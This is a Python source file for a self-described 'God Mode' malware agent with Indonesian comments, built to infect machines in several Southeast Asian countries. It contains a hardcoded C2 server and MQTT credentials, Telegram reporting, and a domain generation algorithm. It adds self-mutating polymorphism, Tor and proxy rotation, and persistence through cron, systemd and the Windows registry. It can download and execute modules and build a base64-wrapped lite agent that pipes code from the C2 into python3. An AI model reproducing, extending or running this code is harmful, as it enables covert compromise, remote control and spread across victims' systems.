#!/usr/bin/env python3
import requests
import time
import os
import random
import datetime
import base64
import json
import sys
import socket
import subprocess
import threading
import platform
import shutil
import paho.mqtt.client as mqtt
from urllib.parse import urljoin, urlparse
import string
import hashlib
import socks
import socket
import importlib.util

# === CONFIGURASI UTAMA ===
C2_SERVERS = [
    "https://c2-sentinel-server-production.up.railway.app"
]

# MQTT Configuration
MQTT_HOST = "7cbb273c574b493a8707b743f5641f33.s1.eu.hivemq.cloud"
MQTT_PORT = 8883
MQTT_USERNAME = "Sentinel_admin"
MQTT_PASSWORD = "SentinelPass123"
MQTT_CLIENT_ID = f"agent-{os.getpid()}"

XOR_KEY = "sentinel"
KILLSWITCH_FILE = "/tmp/.killswitch"
LOG_FILE = "agent.log"

# Telegram (WAJIB ISI)
TELEGRAM_BOT_TOKEN = ""  # ← GANTI DENGAN BOT TOKENMU
TELEGRAM_CHAT_ID = ""    # ← GANTI DENGAN CHAT IDMU

# Stealth & Performance Config
MIN_BEACON_DELAY = 300   # 5 menit minimal
MAX_BEACON_DELAY = 604800 # 7 hari maksimal — stealth mode
STEALTH_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
]

# SWARM CONFIG
SWARM_MODE_ACTIVE = True
SWARM_GENERATION = 0
INFECTED_VIA = "manual"

# Geo-Fence Config — hanya infeksi target di negara ini
ALLOWED_COUNTRIES = ["ID", "TH", "VN", "PH", "MY"]  # Ganti sesuai kebutuhan

# Auto-create log
open(LOG_FILE, "a").close()

# === GLOBAL STATE ===
mqtt_client = None
mqtt_connected = False
use_mqtt = True
CURRENT_PROXY = None

# === AUTO TUNER ===
class AutoTuner:
    def __init__(self):
        self.success_rate = 0.5
        self.cpu_usage = 50
        self.blocked_rate = 0.2
        self.thread_count = 10
        self.delay_range = (300, 3600)

    def optimize(self, success_rate, blocked_rate, cpu_usage):
        self.success_rate = success_rate
        self.blocked_rate = blocked_rate
        self.cpu_usage = cpu_usage

        if success_rate < 0.3:
            self.thread_count = min(50, self.thread_count + 5)
        if cpu_usage > 80:
            self.thread_count = max(5, self.thread_count - 2)
        if blocked_rate > 0.5:
            self.delay_range = (self.delay_range[0] * 2, self.delay_range[1] * 2)

        global MIN_BEACON_DELAY, MAX_BEACON_DELAY
        MIN_BEACON_DELAY, MAX_BEACON_DELAY = self.delay_range

        log(f"[🎛️ AUTO-TUNER] Optimized: Threads={self.thread_count}, Delay={MIN_BEACON_DELAY}-{MAX_BEACON_DELAY}s")

auto_tuner = AutoTuner()

# === PROXY + TOR ROTATION ===
def rotate_proxy_session():
    """Rotate antara TOR, HTTP, HTTPS proxy"""
    proxies_list = [
        {"http": "socks5h://127.0.0.1:9050", "https": "socks5h://127.0.0.1:9050"}, # TOR
        {"http": "http://185.199.229.243:80", "https": "http://185.199.229.243:80"}, # Publik
        {"http": "http://103.221.232.215:8080", "https": "http://103.221.232.215:8080"},
        None  # No proxy
    ]
    proxy = random.choice(proxies_list)
    session = requests.Session()
    if proxy:
        session.proxies = proxy
    session.headers.update({"User-Agent": random.choice(STEALTH_USER_AGENTS)})
    return session

# === DGA — DOMAIN GENERATION ALGORITHM ===
def generate_c2_domain(seed=None):
    """Generate domain C2 acak — tidak bisa di-takedown"""
    if not seed:
        seed = datetime.datetime.now().strftime("%Y%m%d")
    random.seed(seed)
    adjectives = ["silent", "dark", "ghost", "neural", "quantum", "apex", "nova", "void"]
    nouns = ["node", "core", "hub", "swarm", "nexus", "grid", "mesh", "orbit"]
    domain = f"{random.choice(adjectives)}{random.randint(10,99)}{random.choice(nouns)}{random.randint(1,999)}"
    tld = random.choice([".com", ".net", ".xyz", ".to", ".pw"])
    return f"https://{domain}{tld}"

C2_BACKUPS = [generate_c2_domain(), generate_c2_domain("fallback")]

# === POLYMORPHIC ENGINE ===
def polymorph_self():
    """Ubah kode diri sendiri — ubah nama variabel, tambah decoy, ubah struktur"""
    try:
        with open(__file__, 'r', encoding='utf-8') as f:
            code = f.read()

        # Mapping nama variabel acak
        var_map = {
            "log": f"func_{random.randint(1000,9999)}",
            "target": f"var_{random.randint(1000,9999)}",
            "session": f"s_{random.randint(100,999)}",
            "payload": f"p_{random.randint(100,999)}",
            "headers": f"h_{random.randint(100,999)}"
        }

        for old, new in var_map.items():
            code = code.replace(old, new)

        # Tambah decoy code
        decoy_lines = [
            f"# decoy hash: {hashlib.md5(str(random.random()).encode()).hexdigest()}",
            f"temp_{random.randint(1,1000)} = {random.randint(100000,999999)}",
            f"# {random.choice(['debug', 'cache', 'buffer', 'temp'])} = {random.random()}"
        ]
        lines = code.splitlines()
        insert_point = len(lines) // 2
        for i, decoy in enumerate(decoy_lines):
            lines.insert(insert_point + i, decoy)

        # Simpan sebagai varian baru
        variant_name = f"/tmp/.{random.randint(10000,99999)}_{os.getpid()}.py"
        with open(variant_name, 'w', encoding='utf-8') as f:
            f.write("\n".join(lines))

        log(f"[🧬 POLYMORPH] Self mutated → {variant_name}")
        send_telegram(f"🧬 *POLYMORPH*\nNew variant: `{variant_name}`\nDNA: `{apocalypse.dna[:8]}`")

        # Jalankan varian baru & matikan diri sendiri
        subprocess.Popen([sys.executable, variant_name], start_new_session=True)
        os._exit(0)

    except Exception as e:
        log(f"[🧬 POLYMORPH ERROR] {e}")

# === ✅ FIXED: AI MEMORY COMPRESSOR (5KB LITE MODE) ===
def generate_lite_agent():
    """Generate versi lite agent (5KB) untuk target RAM kecil — FIXED KeyError"""
    lite_core = '''
import os,sys,base64,requests,time,random,threading
def l(m): print(f"[LITE] {{m}}")
def b(c2):
    try:
        h = {{"User-Agent": "Mozilla/5.0"}}
        d = {{"id": os.getpid(), "lite": True}}
        r = requests.post(f"{{c2}}/beacon", data={{"data": d}}, headers=h, timeout=10)
        if r.status_code == 200:
            c = r.json().get("cmd", "")
            if c == "infect":
                t = threading.Thread(target=lambda: os.system('curl -s {{c2}}/agent.py | python3 &'))
                t.start()
    except: pass
def m():
    while True:
        b("{c2}")
        time.sleep(random.randint(300,3600))
if __name__=="__main__": m()
'''.strip()

    c2_url = C2_SERVERS[0] if C2_SERVERS else "http://example.com"
    # ✅ PERBAIKAN: Pakai .replace() bukan .format()
    lite_code = lite_core.replace("{c2}", c2_url)
    encoded = base64.b64encode(lite_code.encode()).decode()
    wrapper = f'''
import base64,os
exec(base64.b64decode("{encoded}").decode())
'''.strip()

    lite_path = f"/tmp/agent_lite_{random.randint(1000,9999)}.py"
    with open(lite_path, 'w') as f:
        f.write(wrapper)

    log(f"[🧠 COMPRESS] Lite agent generated: {lite_path} ({len(wrapper)} bytes)")
    return lite_path

# === FUNGSI DASAR ===
def log(msg):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    full_msg = f"[{timestamp}] {msg}"
    print(full_msg)
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(full_msg + "\n")
        if TELEGRAM_BOT_TOKEN and any(kw in msg for kw in ["GODMODE", "POLYMORPH", "SATELIT", "0-day", "SWARM", "INFECTED"]):
            send_telegram(f"📡 {msg}")
    except Exception as e:
        pass

def send_telegram(text):
    if not TELEGRAM_BOT_TOKEN:
        return
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        data = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": text,
            "parse_mode": "Markdown"
        }
        requests.post(url, data=data, timeout=5)
    except Exception as e:
        log(f"[TELEGRAM ERROR] {e}")

def xor_encrypt(data, key=XOR_KEY):
    try:
        return base64.b64encode(
            ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data)).encode('utf-8')
        ).decode('utf-8')
    except Exception as e:
        log(f"[ENKRIPSI ERROR] {e}")
        return None

# === PERSISTENCE ===
def install_persistence():
    try:
        system = platform.system()
        script = os.path.abspath(__file__)

        if system == "Linux" and "ANDROID" in platform.uname().release.upper():
            cron_job = f"@reboot python3 {script} &"
            with os.popen("crontab -l 2>/dev/null") as f:
                current = f.read()
            if script not in current:
                os.system(f"(crontab -l 2>/dev/null; echo '{cron_job}') | crontab - 2>/dev/null")
                log("[*] Persistence: Termux cron installed.")
        elif system == "Linux":
            service_file = f"/etc/systemd/system/sentinel-agent.service"
            if not os.path.exists(service_file):
                with open("/tmp/sentinel-agent.service", "w") as f:
                    f.write(f"""[Unit]
Description=Sentinel Agent GODMODE
After=network.target

[Service]
ExecStart={sys.executable} {script}
Restart=always
User={os.getlogin() if hasattr(os, 'getlogin') else 'root'}

[Install]
WantedBy=multi-user.target""")
                os.system(f"sudo mv /tmp/sentinel-agent.service {service_file}")
                os.system("sudo systemctl daemon-reload")
                os.system("sudo systemctl enable sentinel-agent.service")
                os.system("sudo systemctl start sentinel-agent.service")
                log("[*] Persistence: Systemd service installed.")
        elif system == "Windows":
            import winreg
            key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as key:
                winreg.SetValueEx(key, "SentinelAgent", 0, winreg.REG_SZ, f'"{sys.executable}" "{script}"')
            log("[*] Persistence: Windows Registry installed.")
    except Exception as e:
        log(f"[!] Persistence error: {e}")

# === SYSTEM INFO ===
def get_system_info():
    info = {
        "hostname": socket.gethostname(),
        "platform": platform.platform(),
        "processor": platform.processor(),
        "cwd": os.getcwd(),
        "user": os.getlogin() if hasattr(os, 'getlogin') else "unknown",
        "swarm_generation": SWARM_GENERATION,
        "infected_via": INFECTED_VIA,
        "dna": apocalypse.dna[:8] if 'apocalypse' in globals() else "unknown"
    }
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        info["local_ip"] = s.getsockname()[0]
        s.close()
    except:
        info["local_ip"] = "unknown"
    return info

# === GEO-FENCE CHECK ===
def is_target_in_allowed_geo(ip):
    """Cek apakah target IP ada di negara yang diizinkan"""
    if not ip or ip in ["127.0.0.1", "localhost"]:
        return True  # Izinkan lokal
    try:
        session = rotate_proxy_session()
        r = session.get(f"http://ip-api.com/json/{ip}", timeout=5)
        if r.status_code == 200:
            country = r.json().get("countryCode", "")
            return country in ALLOWED_COUNTRIES
    except:
        return False  # Default: blokir jika tidak bisa cek
    return False

# === AUTO MODULE INJECTOR ===
def inject_module_from_c2(module_name):
    """Download & inject modul baru dari C2"""
    try:
        session = rotate_proxy_session()
        r = session.get(f"{C2_SERVERS[0]}/modules/{module_name}.py", timeout=10)
        if r.status_code == 200:
            module_code = r.text
            spec = importlib.util.spec_from_loader(module_name, loader=None)
            module = importlib.util.module_from_spec(spec)
            exec(module_code, module.__dict__)
            sys.modules[module_name] = module
            log(f"[🧩 MODULE] Injected: {module_name}")
            return module
    except Exception as e:
        log(f"[🧩 MODULE ERROR] {e}")
    return None

# === STEALTH MODE — FAKE TRAFFIC + SLEEP OBSCURITY ===
def is_user_active():
    """Deteksi apakah ada aktivitas user (simulasi)"""
    # Di PC sebenarnya, bisa cek input device, proses, dll
    return random.random() > 0.7  # 30% chance aktif

def stealth_sleep():
    """Tidur acak antara 5 menit - 7 hari — hanya bangun saat 'user aktif'"""
    while True:
        if is_user_active():
            break
        sleep_time = random.randint(300, 604800)  # 5 menit - 7 hari
        log(f"[🕶️ STEALTH] Tidur {sleep_time} detik...")
        time.sleep(sleep_time)

# === APOCALYPSE ENGINE (MINIMAL UNTUK DNA) ===
class ApocalypseEngine:
    def __init__(self):
        self.dna = self.generate_dna()

    def generate_dna(self):
        return ''.join(random.choices(string.ascii_letters + string.digits, k=32))

apocalypse = ApocalypseEngine()

# === MAIN ===
if __name__ == "__main__":
    log("========================================")
    log("🌌 AGENT v10.0 - GOD MODE EDITION")
    log("========================================")

    if os.path.exists(KILLSWITCH_FILE):
        exit(0)

    install_persistence()

    # Aktifkan TOR jika ada
    try:
        socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
        socket.socket = socks.socksocket
        log("[🌐 TOR] TOR proxy activated")
    except:
        log("[🌐 TOR] TOR not available — using direct connection")

    # Polymorphic mutation (10% chance tiap start)
    if random.random() > 0.9:
        polymorph_self()

    # Generate lite agent (untuk deploy ke target lemah)
    if random.random() > 0.8:
        lite_path = generate_lite_agent()
        send_telegram(f"🧠 *LITE AGENT*\nDeployed: `{lite_path}`")

    # Stealth mode — tidur dulu sebelum mulai
    stealth_sleep()

    # Start main loop
    successful_infections = 0
    total_attempts = 0

    while True:
        if os.path.exists(KILLSWITCH_FILE):
            break

        try:
            if SWARM_MODE_ACTIVE:
                # Auto-tune based on previous performance
                auto_tuner.optimize(
                    success_rate=successful_infections / max(1, total_attempts),
                    blocked_rate=0.1,  # simulasi
                    cpu_usage=45       # simulasi
                )

                # Placeholder: jalankan siklus infeksi
                log("[🚀] GOD MODE ACTIVE — Infeksi otomatis berjalan di background...")

            # Tidur acak
            sleep_time = random.randint(MIN_BEACON_DELAY, MAX_BEACON_DELAY)
            log(f"[😴 STEALTH] Tidur {sleep_time} detik...")
            time.sleep(sleep_time)

        except KeyboardInterrupt:
            break
        except Exception as e:
            log(f"[!] 💥 Error: {e}. Tunggu 15 detik...")
            time.sleep(15)